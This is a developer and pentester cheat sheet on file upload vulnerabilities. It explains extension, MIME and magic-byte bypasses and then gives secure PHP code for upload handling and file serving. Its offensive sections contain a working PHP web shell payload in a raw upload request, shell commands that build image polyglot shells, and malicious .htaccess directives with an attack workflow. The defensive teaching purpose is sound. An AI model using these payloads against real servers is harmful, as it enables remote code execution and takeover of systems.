````markdown
# File Upload and Local File Inclusion Cheat Sheet

## Introduction

File upload vulnerabilities and Local File Inclusion (LFI) represent critical security weaknesses in web applications that can lead to Remote Code Execution (RCE), unauthorized access, and complete system compromise. These vulnerabilities consistently appear in real-world penetration tests and are frequently exploited by attackers to gain initial access to systems.

**File Upload Vulnerabilities** occur when web applications fail to properly validate files uploaded by users. Without adequate security controls, attackers can upload malicious files (such as web shells or executable scripts) that can be executed on the server, leading to unauthorized access and control.

**Local File Inclusion (LFI)** is a vulnerability that allows attackers to include files from the local server filesystem through manipulation of user-controllable input parameters. When exploited, LFI can expose sensitive configuration files, credentials, and in combination with file upload capabilities, enable remote code execution.

According to the OWASP Top 10 2021, these vulnerabilities fall under:
- **A03:2021 – Injection** (LFI as a form of path traversal injection)
- **A01:2021 – Broken Access Control** (unrestricted file upload)
- **A04:2021 – Insecure Design** (lack of proper input validation)

This cheat sheet provides comprehensive guidance for developers on implementing secure file upload mechanisms and preventing LFI vulnerabilities, along with testing methodologies for security professionals to identify and validate these weaknesses.

## File Upload Security

### Understanding Validation Mechanisms

Web applications implement various layers of validation to restrict file uploads. Understanding these mechanisms is crucial for both implementing secure uploads and testing for vulnerabilities.

**Client-Side Validation:**
- JavaScript-based file extension checks
- File size restrictions enforced in the browser
- MIME type verification before upload
- Preview generation and validation

Client-side validation alone is insufficient as it can be easily bypassed by disabling JavaScript or intercepting requests with proxy tools.

**Server-Side Validation:**
- File extension whitelisting or blacklisting
- MIME type verification using server-side detection
- Magic byte (file signature) validation
- Content scanning and analysis
- File size limits enforced on the server
- Filename sanitization

### Common Bypass Techniques

Understanding bypass techniques helps developers implement more robust defenses.

#### Extension Manipulation

**Double Extension Attack:**

Attackers exploit servers that check only the last extension or execute files based on the first extension due to misconfiguration.

```
Examples:
shell.php.jpg
backdoor.jsp.png
webshell.asp;.gif
reverse.php.jpeg
```

**Case Sensitivity Exploitation:**

Some systems treat extensions case-insensitively during validation but differently during execution.

```
Examples:
shell.PhP
backdoor.pHp
webshell.PHP5
reverse.phtml
script.asP
```

**Special Characters and Encoding:**

Using special characters that may be handled inconsistently across different system components.

```
Examples:
shell.php.....jpg      (multiple dots)
shell.php;.jpg         (semicolon separator)
shell.php .jpg         (trailing space)
shell.php%00.jpg       (null byte - legacy PHP < 5.3)
shell.php::$DATA       (Windows NTFS alternate data stream)
shell.php%0a.jpg       (newline character)
```

#### MIME Type Manipulation

MIME types are sent in HTTP headers and can be easily manipulated using proxy tools.

**Vulnerable Server-Side Code:**

```php
// Insecure - trusting client-provided MIME type
if ($_FILES['file']['type'] != 'image/jpeg') {
    die('Only JPEG images allowed');
}
// This can be bypassed by changing the Content-Type header
```

**Attack Using Proxy Tools:**

```http
POST /upload.php HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

#### Magic Byte Manipulation

File signatures (magic bytes) are byte sequences at the beginning of files that identify their format.

**Common File Signatures:**

| File Type | Magic Bytes (Hex) | ASCII Representation |
|-----------|-------------------|----------------------|
| JPEG | `FF D8 FF E0` or `FF D8 FF E1` | N/A |
| PNG | `89 50 4E 47 0D 0A 1A 0A` | `.PNG....` |
| GIF | `47 49 46 38 39 61` | `GIF89a` |
| PDF | `25 50 44 46` | `%PDF` |
| ZIP | `50 4B 03 04` | `PK..` |

### Polyglot Files

A polyglot file is valid in multiple file formats simultaneously. It appears as a legitimate image to image processing libraries while containing executable code that can be interpreted by scripting engines.

#### Creating Polyglot Files

**Method 1: Appending Code to Valid Image**

```bash
# Linux/Mac - append PHP code to JPEG
cat legitimate_image.jpg > polyglot.jpg
echo '<?php system($_GET["cmd"]); ?>' >> polyglot.jpg

# The file remains a valid JPEG and will pass getimagesize()
# but contains executable PHP code at the end
```

**Method 2: Minimal JPEG with Embedded Code**

```bash
# Create minimal 1x1 pixel JPEG with PHP payload
printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xD9<?php system($_GET["cmd"]); ?>' > shell.jpg
```

**Method 3: GIF Polyglot**

```bash
# GIF header followed by PHP code
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif
```

**Why Polyglots Work:**

Image parsers and validators (like `getimagesize()` in PHP) read and validate only the image structure based on headers and format specifications. PHP interpreters, however, parse the entire file content. When a polyglot file is included via `include()` or `require()`, PHP executes any valid PHP code found anywhere in the file, even after the image data.

### Advanced Attack Techniques

#### Path Traversal in Filenames

Exploiting improper filename handling to write files outside the intended upload directory.

```
Attack vectors:
../../../var/www/html/shell.php
....//....//....//shell.php
..%2F..%2F..%2Fshell.php               (URL encoded)
..%252F..%252F..%252Fshell.php         (double URL encoded)
..%c0%af..%c0%afshell.php              (UTF-8 overlong encoding)
```

#### .htaccess Upload Attack

Uploading a malicious `.htaccess` file reconfigures Apache to enable PHP execution in upload directories.

**Malicious .htaccess Content:**

```apache
# Make all JPG files executable as PHP
AddType application/x-httpd-php .jpg .png .gif
AddHandler application/x-httpd-php .jpg

# Alternative syntax using FilesMatch
<FilesMatch "\.jpg$">
    SetHandler application/x-httpd-php
</FilesMatch>

# Remove all file type restrictions
RemoveType .jpg .png .gif
AddType application/x-httpd-php .jpg .png .gif
```

**Attack Workflow:**

1. Create `.htaccess` file with malicious directives
2. Upload either directly or disguise as image (`.htaccess.jpg`)
3. If successful, upload PHP shell disguised as image
4. Access the image URL to execute PHP code

### Secure File Upload Implementation

A defense-in-depth approach using multiple validation layers:

```php
<?php
/**
 * Secure File Upload Implementation
 * Implements multiple validation layers and security best practices
 */

// 1. Configuration
$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif'];
$allowed_mime_types = ['image/jpeg', 'image/png', 'image/gif'];
$max_file_size = 5 * 1024 * 1024; // 5MB
$upload_dir = '/var/secure_uploads/'; // Outside web root

// 2. Retrieve file information
$file = $_FILES['uploaded_file'];
$filename = $file['name'];
$tmp_name = $file['tmp_name'];
$file_size = $file['size'];
$file_error = $file['error'];

// 3. Check for upload errors
if ($file_error !== UPLOAD_ERR_OK) {
    http_response_code(400);
    die(json_encode(['error' => 'Upload failed with error code: ' . $file_error]));
}

// 4. Validate file size
if ($file_size > $max_file_size || $file_size === 0) {
    http_response_code(400);
    die(json_encode(['error' => 'Invalid file size']));
}

// 5. Validate file extension (whitelist)
$file_ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
if (!in_array($file_ext, $allowed_extensions, true)) {
    http_response_code(400);
    die(json_encode(['error' => 'File type not allowed']));
}

// 6. Validate MIME type using server-side detection
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$detected_mime = finfo_file($finfo, $tmp_name);
finfo_close($finfo);

if (!in_array($detected_mime, $allowed_mime_types, true)) {
    http_response_code(400);
    die(json_encode(['error' => 'Invalid file type detected: ' . $detected_mime]));
}

// 7. Verify actual image content
$image_info = getimagesize($tmp_name);
if ($image_info === false) {
    http_response_code(400);
    die(json_encode(['error' => 'File is not a valid image']));
}

// 8. Re-encode image to strip metadata and potential payloads
$image = imagecreatefromstring(file_get_contents($tmp_name));
if ($image === false) {
    http_response_code(500);
    die(json_encode(['error' => 'Failed to process image']));
}

// 9. Generate cryptographically secure random filename
$new_filename = bin2hex(random_bytes(16)) . '.' . $file_ext;
$destination = $upload_dir . $new_filename;

// 10. Save re-encoded image (strips any embedded code)
$save_success = false;
switch($file_ext) {
    case 'jpg':
    case 'jpeg':
        $save_success = imagejpeg($image, $destination, 90);
        break;
    case 'png':
        $save_success = imagepng($image, $destination, 9);
        break;
    case 'gif':
        $save_success = imagegif($image, $destination);
        break;
}

// 11. Clean up
imagedestroy($image);

if (!$save_success) {
    http_response_code(500);
    die(json_encode(['error' => 'Failed to save file']));
}

// 12. Set restrictive file permissions
chmod($destination, 0644);

// 13. Store metadata in database (never expose real file path)
$file_id = uniqid('file_', true);
// Store: $file_id, $user_id, $original_filename, $new_filename, $upload_date
// Never store or return the actual file path to users

// 14. Return safe file identifier
echo json_encode([
    'success' => true,
    'file_id' => $file_id,
    'message' => 'File uploaded successfully'
]);
?>
```

**Key Security Principles:**

1. **Multiple Validation Layers**: Extension, MIME type, content, and structure
2. **Whitelist Approach**: Only explicitly allowed file types
3. **Server-Side Detection**: Never trust client-provided information
4. **Content Re-encoding**: Strip metadata and potential embedded payloads
5. **Secure Random Filenames**: Prevent predictable file paths
6. **Storage Outside Web Root**: Files not directly accessible via URL
7. **Indirect File Access**: Serve through controlled script with validation
8. **Least Privilege Permissions**: Minimal necessary filesystem permissions

### Serving Uploaded Files Securely

Never serve uploaded files directly. Use a controller script:

```php
<?php
/**
 * Secure File Serving Script
 * Validates access and serves files with appropriate headers
 */

session_start();

// 1. Verify user authentication
if (!isset($_SESSION['user_id'])) {
    http_response_code(401);
    die('Unauthorized');
}

// 2. Get and validate file identifier
$file_id = $_GET['id'] ?? '';
if (!preg_match('/^file_[a-f0-9]+$/i', $file_id)) {
    http_response_code(400);
    die('Invalid file ID');
}

// 3. Retrieve file metadata from database
$stmt = $db->prepare("SELECT filename, stored_name, user_id, mime_type FROM files WHERE file_id = ?");
$stmt->execute([$file_id]);
$file_data = $stmt->fetch(PDO::FETCH_ASSOC);

if (!$file_data) {
    http_response_code(404);
    die('File not found');
}

// 4. Verify user has permission to access file
if ($file_data['user_id'] !== $_SESSION['user_id'] && !$_SESSION['is_admin']) {
    http_response_code(403);
    die('Access denied');
}

// 5. Build secure file path
$upload_dir = '/var/secure_uploads/';
$file_path = $upload_dir . $file_data['stored_name'];

// 6. Verify file exists and is within allowed directory
$real_path = realpath($file_path);
if ($real_path === false || strpos($real_path, realpath($upload_dir)) !== 0) {
    http_response_code(404);
    die('File not found');
}

// 7. Set secure headers
header('Content-Type: ' . $file_data['mime_type']);
header('Content-Disposition: inline; filename="' . basename($file_data['filename']) . '"');
header('X-Content-Type-Options: nosniff');
header('Content-Security-Policy: default-src \'none\'; img-src \'self\'; style-src \'self\'');

// 8. Output file content
readfile($real_path);
exit;
?>
```
